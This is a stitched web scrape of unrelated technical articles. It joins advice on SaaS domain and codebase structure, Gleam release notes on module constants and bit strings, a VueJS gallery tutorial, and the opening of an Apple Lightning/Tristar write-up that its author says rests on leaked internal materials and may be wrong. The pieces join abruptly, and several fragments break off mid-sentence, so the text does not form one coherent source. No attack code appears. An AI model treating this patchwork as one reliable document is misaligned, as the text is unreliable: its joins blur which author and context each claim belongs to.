    <p>Use organization slug as a pathname, not as a subdomain. It makes the use of SSL much easier, and you have less work to do to set up organization accounts. For this, you lose the ease to route your customers to different machines based on their URLs, and it pollutes your sitemap. You need to be careful when adding routes to your marketing website not to use any customer slug.</p>
  </li>
  <li>
    <p>For this last question, the current recommendation is still to use a subfolder for your blog.</p>
  </li>
</ol>

<p>You can read more about why I recommend these at the end of this article.</p>
    <hr>

<p>Let’s go and explore the advantages and disadvantages of each strategy.</p>

<p>I explore what kind of recommendations I found at the first search and then try to give my own arguments for this.</p>

<p><em>1. IndieHackers Discussion</em></p>

<p><a href="https://www.indiehackers.com/forum/questions-for-saas-founders-0519d4f95e" target="_blank" rel="noopener">Here</a> is an interesting discussion about organizing the domain structure of a SaaS. This discussion is mainly referring to how to organize the main website (marketing website) with</p>

<p>In that thread there are proposed 2 solutions:</p>

<p>A. Main website on example.com and SaaS product at subdomain.example.com like:</p>
<ul>
  <li>Main website or marketing website at <code>https://example.com</code>
</li>
  <li>SaaS app living at subdomain.example.com, with the following examples:
    <ul>
      <li><code>app.example.com</code></li>
      <li><code>dashboard.example.com</code></li>
      <li><code>admin.example.com</code></li>
      <li><code>my.example.com</code></li>
    </ul>
  </li>
</ul>

<p>B. Main website at example.com and SaaS product living at example.com/folder  like:</p>
<ul>
  <li>Admin at <code>example.com/admin</code>
</li>
  <li>App at <code>example.com/dashboard</code>
</li>
  <li>Blog at <code>example.com/blog</code>
</li>
  <li>API at <code>example.com/api</code>
</li>
</ul>

<p>The main reasons for going for subdomain structure (option A):</p>

<p>a. SEO concern: when the SEO is important only for the marketing website and when the SaaS product itself, it is not part of the SEO strategy and should not be indexed.</p>

<p>b. It is easy to segment the traffic in case of heavy load and assure some kind of QoS</p>

<p>c. It is easy to setup Cloudflare or CDN when traffic increases when a subdomain structure</p>

<p>d. It is easy to setup difference services like example.com to <a href="https://www.netlify.com/" target="_blank" rel="noopener">Netlify</a>, app.example.com to <a href="https://www.heroku.com/" target="_blank" rel="noopener">Heroku</a> and blog.example.com to <a href="https://write.as/pro" target="_blank" rel="noopener">Write.as</a> for example.</p>

<p>d. Improved security by separation of concerns, even it is not clear there is the security is better only because of the subdomain structure, or it is a side effect of hosting them on difference resources</p>

<p>The main reason for choosing the folder structure (option B):</p>
<ol>
  <li>When there is a need to share data between the SaaS product and marketing website for SEO  (like the number of users who applied so far …)</li>
  <li>Keeping everything in the same codebase facilitates code reuse thus increasing productivity</li>
  <li>Speed of development and fewer ops needed to maintain the infrastructure</li>
</ol>

<p><em>2. Clubhouse article about using a single subdomain</em></p>

<p><a href="https://clubhouse.io/blog/building-a-saas-app-you-should-probably-stick-to-a-single-subdomain-455695e1d03c/" target="_blank" rel="noopener">Here</a> is the article from Clubhouse written by Andrew Childs, Chief Design Officer and Co-founder of Clubhouse.</p>

<p>Here is a quote from that article explaining their recommendation:</p>
<blockquote>
  <p>If you’re building a SaaS app that has any third-party OAuth integrations, or your product allows a user to switch between multiple organizations, you should put the organization in the pathname and use a single subdomain (like “app”) for your application.</p>
</blockquote>

<p>Key takeaways from the article:</p>
<ol>
  <li>Having the organization slug  in the pathname makes it easier to switch organizations and to work with different URLs in dev/staging and production</li>
  <li>It is easier to whitelist the domain in case you are working with OAuth providers (as you only need to whitelist a single domain). In this case, you don’t need to rely on third-party providers to support wildcard domains.</li>
  <li>It allows us to get an Extended Validation SSL certificate as these are not assigned to wildcard domains.</li>
</ol>

<p><em>3. Winderwind - How to select a future-proof subdomain structure</em></p>

<p>Source of the article is <a href="https://winterwindsoftware.com/how-to-select-a-future-proof-subdomain-structure-for-saas-web-app/" target="_blank" rel="noopener">here</a></p>

<p>The article recommends the following structure:</p>
<ol>
  <li>The marketing website should be on the main domain and separated from the product app</li>
  <li>The product app should live on its own subdomain. Here are some suggestions from the article:
a. <em>dashboard</em> – Used by  <a href="https://stripe.com/" target="_blank" rel="noopener">Stripe</a> 
b. <em>manage</em> – Used by  <a href="https://gocardless.com/" target="_blank" rel="noopener">GoCardless</a> 
c. <em>portal</em> – This is what I use for  <a href="https://autochart.io/" target="_blank" rel="noopener">Autochart</a> 
d. <em>my</em> – Used by  <a href="https://www.xero.com/" target="_blank" rel="noopener">Xero</a> 
e. <em>account</em> – Used by  <a href="https://postmarkapp.com/" target="_blank" rel="noopener">Postmark</a> 
f. <em>secure</em> – Used by  <a href="https://helpscout.net/" target="_blank" rel="noopener">HelpScout</a>
</li>
  <li>Keep the marketing site and the blog on the same domain</li>
  <li>Keep the API on the same subdomain as the product app</li>
</ol>

<p>Reasons for separating the marketing website and product app from the article are:</p>
<ol>
  <li>It makes it easy to work with non-technical people on the marketing website and minimizes downtime when upgrading them</li>
  <li>It allows using static CDN for the marketing website</li>

          Use separate codebases for product app and marketing website <a href="#use-separate-codebases-for-product-app-and-marketing-website">#</a>

          Reasons for separate codebase <a href="#reasons-for-separate-codebase">#</a>
        
        
      </h4>

<p>Even if you are a single owner of your project, it makes sense to have this split between codebases because it will first and foremost make sure bugs don’t leak between these two components. Imagine a bug in your CSS/JS flow while trying to fix something on the marketing website that might impact your customers who are using your product app. It makes the testing easier because you can have different test coverage and test thoroughness, allowing you, for example, to say that the marketing website should only pass several N positive scenarios without being concerned with negative scenarios.</p>

<p>The second biggest advantage is having different release schedules between them. You can play more easily with the marketing website (A / B testing, testing copywrite, SEO tags) and release them as often as you like without any (let’s say this again without any) concern for a possible effect of your existing customers of the product app. It decreases downtime for users of the product app. You don’t need to restart product app services each time you want to add/change/remove a text from the marketing website.</p>

<p>The third advantage is related to the ability to use different frameworks and languages for marketing website than for the product app, thus allowing you also to use different hosting services if you like without having to create a complicated release process. You can decide to make your marketing website a static website generated by Jekyll or Middleman or Ghost and then release it to Netlify while using Ruby or Python or Elixir for your product app and host them on AWS or Heroku or Digital Ocean.</p>
    
      <h4 id="concerns-against">
        
        
          Concerns against <a href="#concerns-against">#</a>
        
        
      </h4>

<p>First, DO NOT DO separate codebases if you plan to show live data (or as fresh as possible) in your marketing website from your product app (like the number of accounts created so far …). In this case, you need to create and maintain an API server and client with maybe authentication or at least a security layer, and there is no need for this.</p>

<p>The biggest concern is related to the branding synchronization among the two projects. You need to have consistent branding (using the same colors, fonts, sizes, elements). This impairs your speed when changing these attributes. For this, there is no quick fix. 
What can be done is creating a separate project where you maintain your CSS and JS, maybe also some HTML components, and then use two in your two projects. Of course, this comes with extra maintenance overhead.</p>

<p>The second concern is the overhead needed to maintain two codebases and their release scripts. There is, in the beginning, a small overhead to setup CI/CD for both projects with most of the time spent into creating the automated testing environment.</p>

<p>The third concern is code reuse, especially if you are using the same …</p></div></div>

      <p>1 month and 10,910 lines of code later it is time for another Gleam
release! Let’s see what’s new this time.</p>

<h2 id="module-constants">Module constants</h2>

<p>Sometimes we want to use a certain fixed value in multiple places in our
project. Until now we’ve had two options. The first option was to copy and
paste the value into multiple places in our code.</p>

<div><div><pre><code><span>pub</span> <span>fn</span> <span>is_before</span><span>(</span><span>year</span><span>:</span> <span>Int</span><span>)</span> <span>-&gt;</span> <span>Bool</span> <span>{</span>
  <span>year</span> <span>&lt;</span> <span>2101</span>
<span>}</span>

<span>pub</span> <span>fn</span> <span>is_during</span><span>(</span><span>year</span><span>:</span> <span>Int</span><span>)</span> <span>-&gt;</span> <span>Bool</span> <span>{</span>
  <span>2101</span> <span>&lt;=</span> <span>year</span> <span>&amp;&amp;</span> <span>year</span> <span>&lt;=</span> <span>2111</span>
<span>}</span>
</code></pre></div></div>

<p>Duplication of values like this is error prone, especially if we want to
update the values later, as we’ll need to find every place it’s used in order
to change it.</p>

<p>Another option is to wrap the value in a function.</p>

<div><div><pre><code><span>pub</span> <span>fn</span> <span>start_year</span><span>()</span> <span>-&gt;</span> <span>Int</span> <span>{</span>
  <span>2101</span>
<span>}</span>

<span>pub</span> <span>fn</span> <span>end_year</span><span>()</span> <span>-&gt;</span> <span>Int</span> <span>{</span>
  <span>2111</span>
<span>}</span>

<span>pub</span> <span>fn</span> <span>is_before</span><span>(</span><span>year</span><span>:</span> <span>Int</span><span>)</span> <span>-&gt;</span> <span>Bool</span> <span>{</span>
  <span>year</span> <span>&lt;</span> <span>start_year</span><span>()</span>
<span>}</span>

<span>pub</span> <span>fn</span> <span>is_during</span><span>(</span><span>year</span><span>:</span> <span>Int</span><span>)</span> <span>-&gt;</span> <span>Bool</span> <span>{</span>
  <span>start_year</span><span>()</span> <span>&lt;=</span> <span>year</span> <span>&amp;&amp;</span> <span>year</span> <span>&lt;=</span> <span>end_year</span><span>()</span>
<span>}</span>
</code></pre></div></div>

<p>This is better than copying the value in our code, but isn’t yet ideal. A
function can perform any amount of computation (with side effects!) when it is
called, so we have to read the definition of the function to be sure what it
does.</p>

<p>To make matters worse Gleam’s case clause guards don’t support calling of
functions within them, so this code will be rejected by the compiler:</p>

<div><div><pre><code><span>pub</span> <span>describe</span><span>(</span><span>year</span><span>:</span> <span>Int</span><span>)</span> <span>-&gt;</span> <span>String</span> <span>{</span>
  <span>case</span> <span>year</span> <span>{</span>
    <span>year</span> <span>if</span> <span>year</span> <span>&lt;</span> <span>start_year</span><span>()</span> <span>-&gt;</span> <span>"Before"</span>
    <span>year</span> <span>if</span> <span>year</span> <span>&gt;</span> <span>end_year</span><span>()</span> <span>-&gt;</span> <span>"After"</span>
    <span>_</span> <span>-&gt;</span> <span>"During"</span>
  <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>To solve all these problems Gleam now has module constants. They are always
inlined by the compiler, and can be used in case clause guards.</p>

<p>Using them the above code can be rewritten like so:</p>

<div><div><pre><code><span>pub</span> <span>const</span> <span>start_year</span><span>:</span> <span>Int</span> <span>=</span> <span>2101</span>
<span>pub</span> <span>const</span> <span>end_year</span><span>:</span> <span>Int</span> <span>=</span> <span>2111</span>

<span>pub</span> <span>fn</span> <span>is_before</span><span>(</span><span>year</span><span>:</span> <span>Int</span><span>)</span> <span>-&gt;</span> <span>Bool</span> <span>{</span>
  <span>year</span> <span>&lt;</span> <span>start_year</span>
<span>}</span>

<span>pub</span> <span>fn</span> <span>is_during</span><span>(</span><span>year</span><span>:</span> <span>Int</span><span>)</span> <span>-&gt;</span> <span>Bool</span> <span>{</span>
  <span>start_year</span> <span>&lt;=</span> <span>year</span> <span>&amp;&amp;</span> <span>year</span> <span>&lt;=</span> <span>end_year</span>
<span>}</span>

<span>pub</span> <span>describe</span><span>(</span><span>year</span><span>:</span> <span>Int</span><span>)</span> <span>-&gt;</span> <span>String</span> <span>{</span>
  <span>case</span> <span>year</span> <span>{</span>
    <span>year</span> <span>if</span> <span>year</span> <span>&lt;</span> <span>start_year</span> <span>-&gt;</span> <span>"Before"</span>
    <span>year</span> <span>if</span> <span>year</span> <span>&gt;</span> <span>end_year</span> <span>-&gt;</span> <span>"After"</span>
    <span>_</span> <span>-&gt;</span> <span>"During"</span>
  <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>Much better! Module constants are going to provide the basis of some exciting
new features in future, so watch this space. 🚀</p>

<p>Thanks to <a href="https://github.com/thehabbos007">Ahmad Sattar</a> for taking the
lead in the implementation of this feature.</p>

<h2 id="bit-string-syntax">Bit string syntax</h2>

<p>One of great things about Erlang is how easy it is to work with raw bits and
bytes using the bit string literal syntax. Starting with this release Gleam
supports this too!</p>

<p>Explaining all the things one can do with the bit string syntax would take
longer than I have now, but in short they give a declarative way of
constructing and parsing raw data of any format. What’s more the Erlang VM is
highly optimised for this, so bit syntax is highly efficient too!</p>

<p>For example, if I wanted to create a 4 byte unsigned little endian integer
with the value of 100 I could do so using bit syntax like this:</p>

<div><div><pre><code><span>let</span> <span>my_integer</span> <span>=</span> <span>&lt;&lt;</span><span>100</span><span>:</span><span>unsigned</span><span>-</span><span>little</span><span>-</span><span>int</span><span>-</span><span>size</span><span>(</span><span>4</span><span>)</span><span>&gt;&gt;</span>
</code></pre></div></div>

<p>Or if I wanted to extract the title, artist, album, year, and comment from an
MP3 music file’s ID3 tags I could pattern match on it like this:</p>

<div><div><pre><code><span>pub</span> <span>fn</span> <span>get_metadata</span><span>(</span><span>id3</span><span>:</span> <span>BitString</span><span>)</span> <span>-&gt;</span> <span>Result</span><span>(</span><span>Metadata</span><span>,</span> <span>String</span><span>)</span> <span>{</span>
  <span>case</span> <span>id3</span> <span>{</span>
    <span>&lt;&lt;</span>
      <span>"TAG"</span><span>:</span><span>utf8</span><span>,</span>
      <span>title</span><span>:</span><span>utf8</span><span>-</span><span>size</span><span>(</span><span>30</span><span>),</span>
      <span>artist</span><span>:</span><span>utf8</span><span>-</span><span>size</span><span>(</span><span>30</span><span>),</span>
      <span>album</span><span>:</span><span>utf8</span><span>-</span><span>size</span><span>(</span><span>30</span><span>),</span>
      <span>year</span><span>:</span><span>utf8</span><span>-</span><span>size</span><span>(</span><span>4</span><span>),</span>
      <span>comment</span><span>:</span><span>utf8</span><span>-</span><span>size</span><span>(</span><span>30</span><span>),</span>
      <span>_</span><span>rest</span><span>:</span><span>binary</span><span>,</span>
    <span>&gt;&gt;</span> <span>-&gt;</span> <span>Ok</span><span>(</span><span>Metadata</span><span>(</span><span>title</span><span>,</span> <span>artist</span><span>,</span> <span>album</span><span>,</span> <span>year</span><span>,</span> <span>comment</span><span>))</span>

    <span>_</span> <span>-&gt;</span> <span>Error</span><span>(</span><span>"Not a valid ID3 tag"</span><span>)</span>
  <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>Thanks to <a href="https://benjamintan.io/blog/2014/06/10/elixir-bit-syntax-and-id3/">Benjamin Tan’s blog post</a>
for this example.</p>

<p>For another example of bit syntax in action check out this <a href="https://github.com/lpil/ecoji/"><em>very serious</em>
base64 encoding alternative</a> which converts arbitrary data into emojis!</p>

<p>As part of this new feature we have introduced <code>BitString</code> and <code>UtfCodepoint</code>
types into the prelude, and split the standard library <code>Iodata</code> type into
<a href="https://hexdocs.pm/gleam_stdlib/gleam/string_builder/"><code>StringBuilder</code></a> and <a href="https://hexdocs.pm/gleam_stdlib/gleam/bit_builder/"><code>BitBuilder</code></a> types, which
are for efficiently constructing strings and bit strings respectively.</p>

<p>Thanks to <a href="https://github.com/tomwhatmore">Tom Whatmore</a> for taking the
lead in the implementation of this feature.</p>

<h2 id="the-rest">The rest</h2>

<p>There are many more new additions, improvements, and bug fixes to the compiler and
the standard library, including but not limited to support for regex expressions
(implemented by <a href="https://github.com/eterps/">Erik Terpstra</a>) and environment
variables (implemented by <a href="https://github.com/crowdhailer/">Peter Saxton</a>).</p>

<p>For information on the rest in this release please check out the <a href="https://github.com/gleam-lang/gleam/blob/main/CHANGELOG.md#v0100---2020-07-01">Gleam
changelog</a> and the <a href="https://github.com/gleam-lang/stdlib/blob/main/CHANGELOG.md#v0101---2020-07-01">standard library
changelog</a>.</p>

virtual machine a production-ready reality please consider <strong><a href="https://github.com/sponsors/lpil">sponsoring

<p>I’ve been playing with VueJS recently. I’m impressed. It’s simple, powerful, super fun and incredibly popular. Even a moron like me can do interesting things with it rapidly. It just goes to show that anybody can do great things with it. Do you have five minutes in front of you ?</p>



<h3>Once upon a time</h3>



<p>2012 in the New York area. <strong>At that time <a aria-label="undefined (s’ouvre dans un nouvel onglet)" href="https://twitter.com/youyuxi" target="_blank" rel="noreferrer noopener">Evan You</a> is living his best life learning Javascript.</strong> He’s doing side projects left and right for laughs. One of them explodes in <a aria-label="undefined (s’ouvre dans un nouvel onglet)" href="https://news.ycombinator.com/item?id=3618387" target="_blank" rel="noreferrer noopener">popularity on Hackernews</a> ! Evan didn’t know, but he just got Google’s attention.</p>



<figure><img src="https://i.imgur.com/8wEZsjZ.png" data-src="https://i.imgur.com/8wEZsjZ.png" alt="vuejs"></figure>



<p>Very quickly hired at Google, his role is to create “experimental projects” for innovative ideas. He uses a lot of vanilla Javascript. He tries AngularJS and other frameworks, but he rages instantly on it. He doesn’t find the freedom he needs. So he had an idea : <strong>extract the best part of these frameworks and make his own light and malleable framework for his own personal need</strong>.</p>



<p>In July 2013, the first commit of VueJS was made. For the record, VueJS was to be called Seed.JS. But it was taken on NPM! Since its framework is centered around the view part, Evan wanted something that looked like “View” in English. He went to google translate and translated “View” into several languages. <strong>He came across the French translation “Vue” and <a aria-label="undefined (s’ouvre dans un nouvel onglet)" href="https://www.youtube.com/watch?v=OrxmtDw4pVI&amp;feature=youtu.be&amp;t=374" target="_blank" rel="noreferrer noopener">found it cool</a>.</strong> A few minutes later, VueJS was published.</p>



<p>In 2014, the first version of VueJS arrived on the Internet. The project doesn’t explode right away. But like <a aria-label="undefined (s’ouvre dans un nouvel onglet)" href="https://twitter.com/taylorotwell/status/590585596780879872" target="_blank" rel="noreferrer noopener">the creator of Laravel</a>, more and more people are talking about it. Today, <a href="https://npm-stat.com/charts.html?package=react&amp;package=vue&amp;package=angular&amp;from=2014-05-20&amp;to=2020-05-20" target="_blank" aria-label="undefined (s’ouvre dans un nouvel onglet)" rel="noreferrer noopener">VueJS is in the big league</a>.</p>



<h3>What is VueJS ?</h3>



<p><strong>VueJS is a Javascript frontend framework to create user interfaces.</strong> You’re going to say “one more?” and the answer is yes. Except it’s a little different.</p>



<p><strong>First, it’s interesting to understand that VueJS was designed to be incrementally integrated</strong>. That means if you have an existing frontend application, you don’t have to redo everything. You can make a new part in VueJS and quickly integrate it with the rest.</p>



<p>VueJS is also the most is easy to pick up of all the frontend framework. <strong>That’s what attracted me as a backend developer in the first place. </strong>Very quickly, I did some frontend stuff that worked ! I was shocked! Within a few hours of reading the doc and testing stuff, I had understood all the basics. I was already shipping frontend.</p>



<figure><img src="https://i.imgur.com/UTgj9wh.png" data-src="https://i.imgur.com/UTgj9wh.png" alt="ship"></figure>



<p>VueJS also takes good ideas from its competitors. It allows data binding.<strong> The data and the DOM are coupled and reactive to changes.</strong> We also find <a href="https://bitsofco.de/understanding-the-virtual-dom/" target="_blank" aria-label="undefined (s’ouvre dans un nouvel onglet)" rel="noreferrer noopener">the concept of virtual dom</a> with VueJS. The DOM is not directly changed, it goes through the virtual DOM.</p>



<p>We also find <a aria-label="undefined (s’ouvre dans un nouvel onglet)" href="https://vuejs.org/v2/guide/components.html" target="_blank" rel="noreferrer noopener">the organization by component</a>. <strong>This feature allows you to divide your application into several sub-components that each manage their own life and are reusable.</strong> Let’s imagine you want to make a list of images: you can make a component that manages an image and a component that manages a list of image components.</p>



<p>That’s all well and good, but how does it work?</p>



<h3>How does it work?</h3>



<p>For once I cheat a bit and show some code in advance to better understand what’s coming next. Hello World!</p>



<pre data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">&lt;!DOCTYPE html&gt;
&lt;html&gt;
  &lt;head&gt;
    &lt;script src="https://cdn.jsdelivr.net/npm/vue"&gt;&lt;/script&gt;
  &lt;/head&gt;
  &lt;body&gt;
    &lt;div id="app"&gt;{{ message }}&lt;/div&gt;
    &lt;script&gt;
      const data = { message: "Hello World !" };
      new Vue({
        el: "#app",
        data: data
      });
    &lt;/script&gt;
  &lt;/body&gt;
&lt;/html&gt;</pre>



<p>VueJS focuses on the view part of your application.<strong> To do so, the framework is partly inspired by <a aria-label="undefined (s’ouvre dans un nouvel onglet)" href="https://en.wikipedia.org/wiki/Model%E2%80%93view%E2%80%93viewmodel" target="_blank" rel="noreferrer noopener">the MVVM architecture pattern</a>.</strong> VueJS will link your DOM, the view part, with your view instance, the Model-View part. These two parts are linked by the data-binding system.</p>



<p>Finally, the data in your view instance is the Model part. <strong>It will provide your application with data.</strong> The Hello World code schematized looks like this.</p>



<div><figure><img src="https://i.imgur.com/p3IKY9G.jpg" data-src="https://i.imgur.com/p3IKY9G.jpg" alt="vuejs"></figure></div>



<p>A VueJS application is composed of one or more components. When the instance of the global application is launched, there is first a root instance. <strong>This is root instance is composed of a tree of components which have their own root instance.</strong></p>



<p>But what happens to the life cycle of your instance when you create the component with new Vue()? I wanted to make my usual silly schema but it turns out that t<strong>he official VueJS doc is just EXCELLENT</strong>. <a href="https://www.jesuisundev.com/en/please-write-your-technical-documentation/" target="_blank" aria-label="undefined (s’ouvre dans un nouvel onglet)" rel="noreferrer noopener">It’s rare to have a good documentation</a>. So I’m just going to pump their schema.</p>



<div><figure><img src="https://vuejs.org/images/lifecycle.png" data-src="https://vuejs.org/images/lifecycle.png" alt="vuejs"></figure></div>



<p>I’ll let you admire it and figure out what’s going on. The only thing that might be unclear is the difference between “created” and “mounted”.</p>



<ul><li><strong>Created </strong>means that the element is only available in the View-Model part.</li><li><strong>Mounted </strong>in VueJS means that the DOM element has been rendered in your page and you can manipulate it.<br></li></ul>



<p>OK great, now let’s get our hands dirty.</p>



<h3>Show me the code</h3>



<p>I’m gonna show you a piece of code I made for a personal need. <strong>A simple responsive gallery with only three components.</strong> We start with the root app.</p>



<p><strong>app.vue</strong></p>



<pre data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">&lt;template&gt;
  &lt;div id="app"&gt;
    &lt;action v-bind:message="messageAction"&gt;&lt;/action&gt;
    &lt;grid v-bind:photos="photos"&gt;&lt;/grid&gt;
  &lt;/div&gt;
&lt;/template&gt;

&lt;script&gt;
  import action from './components/action.vue'
  import grid from './components/grid.vue'

  export default {
    name: 'App',
    components: { action, grid },
    data: function () {
      return {
        photos: [
          {
            id: 0,
            url: "https://i.imgur.com/p3IKY9G.jpg"
          }
        ],
        messageAction: "It's working !"
      }
    }
  }
&lt;/script&gt;

&lt;style&gt;
  * {
    box-sizing: border-box;
  }

  body {
    margin: 0;
    font-family: Arial;
  }
&lt;/style&gt;</pre>



<p>On the <strong>template side</strong> I start by declaring my root app in a div. Inside there are two other components (action and grid). <strong>Note how I pass the data that comes from the instance seen in the components with the v-bind directives.</strong></p>



<p>On the <strong>script side</strong>, I import the components to use them in the app we export. We declare the data, the pictures and a message, which is reactive to changes.</p>



<p>On the <strong>style side</strong> I integrate very simple CSS that is global to the whole project.</p>



<p>Next up, the action component.</p>



<p><strong>action.vue</strong></p>



<pre data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">&lt;template&gt;
  &lt;div class="callToAction"&gt;
    &lt;h1&gt;{{ message }}&lt;/h1&gt;
  &lt;/div&gt;
&lt;/template&gt;

&lt;script&gt;
  export default {
    name: 'callToAction',
    props: {
      message: String
    }
  }
&lt;/script&gt;

&lt;style scoped&gt;
  .callToAction {
    position: absolute;
    height: 100%;
    width: 100%;
    padding: 0;
    margin: 0;
    display: -webkit-box;
    display: -moz-box;
    display: -ms-flexbox;
    display: -webkit-flex;
    display: flex;
    align-items: center;
    justify-content: center;
  }

  h1 {
    color: red;
    background:black;
    padding: 10px;
  }
&lt;/style&gt;
</pre>



<p>The action component is simply a text that we put in the middle of the page and that will be a call to action for the user.<strong> I use the {{ message }} syntax to display the message that comes from the app.</strong></p>



<p>Note also that the style part is “scoped”. <strong>This means that the CSS in question has effect only in this component.</strong> This is very useful to separate the style scope of each component.</p>



<p><strong>grid.vue</strong></p>



<pre data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">&lt;template&gt;
  &lt;div class="grid"&gt;
    &lt;div v-bind:key="grid.id" v-for="grid in grids" class="column"&gt;
      &lt;photo
        v-for="photo in grid" 
        v-bind:photo="photo" 
        v-bind:key="photo.id"
      &gt;&lt;/photo&gt;
    &lt;/div&gt;
  &lt;/div&gt;
&lt;/template&gt;

&lt;script&gt;
import photo from './photo.vue'

export default {
  name: 'grid',
  components: { photo },
  props: ['photos'],
  computed: {
    grids: function () {
      const grids = []
      const deepClonePhotos = JSON.parse(JSON.stringify(this.photos))
      const gridsToMake = Math.ceil(deepClonePhotos.length / 2) - 1
      
      for (let index = 0; index &lt;= gridsToMake; index++) {
        const currentGrid = []

        for(let i = 0; i &lt; 2; i++) {
          if(deepClonePhotos.length) {
            currentGrid.push(deepClonePhotos.shift())
          }
        }
        
        grids.push(currentGrid)
      }

      return grids
    }
  }
}
&lt;/script&gt;

&lt;style scoped&gt;
  .grid {
    display: -ms-flexbox; /* IE10 */
    display: flex;
    -ms-flex-wrap: wrap; /* IE10 */
    flex-wrap: wrap;
    padding: 0;
  }

  /* Create four equal columns that sits next to each other */
  .column {
    -ms-flex: 25%; /* IE10 */
    flex: 25%;
    max-width: 25%;
    padding: 0;
  }

  /* Responsive layout - makes a two column-layout instead of four columns */
  @media screen and (max-width: 800px) {
    .column {
      -ms-flex: 50%;
      flex: 50%;
      max-width: 50%;
    }
  }

  /* Responsive layout - makes the two columns stack on top of each other instead of next to each other */
  @media screen and (max-width: 600px) {
    .column {
      -ms-flex: 100%;
      flex: 100%;
      max-width: 100%;
    }
  }
&lt;/style&gt;
</pre>



<p>The grid component is the one that will make the logic to display image grids in relation to the data it receives from the app. In the template part I create a column every two images. In these columns I display my two images. I do this using another photo component. <strong>You will notice the use of the v-for directive to browse my lists.</strong></p>



<p>In the script part, <strong>I use <a aria-label="undefined (s’ouvre dans un nouvel onglet)" href="https://vuejs.org/v2/guide/components-props.html" target="_blank" rel="noreferrer noopener">props</a> to get the data passed by the v-bind in the app</strong>. Then I use the computed function to create a new grids variable with the data of the pictures.</p>



<p><strong>photo.vue</strong></p>



<pre data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">&lt;template&gt;
  &lt;img :src="photo.url" alt ="" /&gt;
&lt;/template&gt;

&lt;script&gt;
  export default {
    name: 'photo',
    props: ['photo']
  }
&lt;/script&gt;

&lt;style scoped&gt;
  .column img {
    vertical-align: middle;
    width: 100%;
  }
&lt;/style&gt;
</pre>



<p>The photo component just allows me to isolate the display of the photo in a corner. It’s quite simple, but it allows me to change a lot of things on this side in the future without having to touch the logic above! <strong>As usual, I put a little <a href="https://codesandbox.io/s/vuejs-en-5-minutes-fz4h4" target="_blank" aria-label="undefined (s’ouvre dans un nouvel onglet)" rel="noreferrer noopener">codesandbox</a>, you can play with it and see it all in action.</strong></p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

                
                <p>Created on 1.7.20</p>

                <p>
                    Here's my little article about (almost) everything I know about Apple Lightning and related technologies: <b>Tristar</b>, <b>Hydra</b>, <b>HiFive</b>, <b>SDQ</b>, <b>IDBUS</b> and etc. But first a tiny warning...
                </p>

                <p><i>
                        Read this article on your own <b>risk</b>! The information in this artcile is based on a lot of AppleInternal materials (leaked datasheets, schematics, source codes) I read in a diagonal direction. And of course on my own research too. I have to warn you, the reader, that I have never done such a research before. Thus, this write-up might use incorrect or just weird terms and turn out partially or completely <b>wrong</b>! 
                    </i>
                </p>

                <p>
                    Before going <i>deeper</i>, let's briefly sort out the terms:
                </p>

                <div>
                    <h2>What's Lightning?</h2>

                    <p><img src="https://nyansatan.github.io/lightning/resources/lightning_port_pinout.jpg"><br>

                    <b>Lightning</b> - is a digital interface used in most of the Apple's iOS devices since late 2012. Replaced the old 30-pin connector</p><p>

                    

                    You can see the female port pinout on the picture above and the connector pinout on the picture below:<br>

                    <img src="https://nyansatan.github.io/lightning/resources/lightning_connector_pinout.jpg"><br>

                    Please pay attention to the fact that in the connector, pins on both sides of connector aren't wired in exact same order. Thus, a host device have to detect orientation of a cable before doing anything else</p><p>
                    
                    

                    Though it's not always applicable. Many Lightning accessories I've played with have mirrored pinouts in their connectors
                </p></div>

                <div>
                    <h2>What're Tristar and Hydra?</h2>

                    <p><img src="https://nyansatan.github.io/lightning/resources/tristar_logo.png"><br>

                    <b>Tristar</b> - is the integrated circuit embedded in every device shipped with Lightning female port. Basically, it's a MUX:<br>

                    <img src="https://nyansatan.github.io/lightning/resources/tristar_schematic.png">

                    Among many other things, its main purpose is to communicate with Lightning male connector once one was connected - detect orientation and detect <b>Accessory ID</b> and route internal interfaces like USB, UART and SWD accordingly</p><p>

                    

                    <b>Hydra</b> - is the new variant of Tristar used since iPhone 8/X. The most significant change appears to be a support of wireless charging, but that's to be verified:<br>
                    
                    <img src="https://nyansatan.github.io/lightning/resources/hydra_schematic.png"><br>

                    There're 5 major Tristar/Hydra variants known to me:</p><ul>
                        <li><b>TI THS7383</b> - first-gen Tristar used in iPad mini 1 and iPad 4</li>
                        <li><b>NXP CBTL1608A1</b> - first-gen Tristar used in iPhone 5 and iPod touch 5</li>
                        <li><b>NXP CBTL1609A1</b> - mysterious first-gen Tristar used in iPod nano 7 - <a target="_blank" href="https://www.ifixit.com/Teardown/iPod+Nano+7th+Generation+Teardown/10826#s38931">source</a></li>
                        <li><b>NXP CBTL1610Ax</b> - second-gen Tristar used since iPhone 5C/5S and apparently everything else that doesn't support wireless charging. There're multiple generations of this one (<b>x</b> - number of generation)</li>
                        <li><b>NXP CBTL1612Ax</b> - Hydra used since iPhone 8/X and apparently everything else that supports wireless charging (<b>x</b> - number of generation)</li>
                    </ul><p>

                    From now on, I'll only use the term <b>Tristar</b>, but keep in mind that it will also mean <b>Hydra</b> as well, as they are very similar in the most of aspects that are gonna be covered in this text
                </p></div>

                <div>
                    <h2>What's HiFive?</h2>

                    <p><img src="https://nyansatan.github.io/lightning/resources/lightning_connector.svg"><br>

                    <b>HiFive</b> - is Lightning slave, i.e. a male connector. It contains a logical element as well - that chip is known as <b>SN2025</b>/<b>BQ2025</b>
                </p></div>

                <div>
                    <h2>What're SDQ and IDBUS?</h2>

                    <p><img src="https://nyansatan.github.io/lightning/resources/idbus_little.png"><br>

